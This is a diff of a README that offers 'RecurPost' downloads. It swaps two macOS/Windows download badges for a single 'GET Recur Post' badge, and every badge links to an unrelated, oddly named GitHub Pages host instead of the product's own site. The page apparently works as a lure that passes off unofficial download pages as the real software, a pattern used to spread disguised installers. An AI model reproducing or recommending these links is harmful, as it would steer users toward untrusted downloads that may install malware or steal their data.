@@ -1,18 +1,6 @@
 # RecurPost Download — Social Media Platform
 
-<a href="https://git-apps-io.github.io/.github/?offer=RecurPost" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/RecurPost%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="RecurPost for macOS">
-</a>
-
-<a href="https://git-apps-io.github.io/.github/?offer=RecurPost" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/RecurPost%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="RecurPost for Windows">
-</a>
+[![GET Recur Post](https://img.shields.io/badge/GET%20%E2%80%94%20Recur-Post-0078D6?style=for-the-badge&logoColor=white)](https://pocekayprofouellette.github.io/.github/Recur-Post)
 
 ---
 
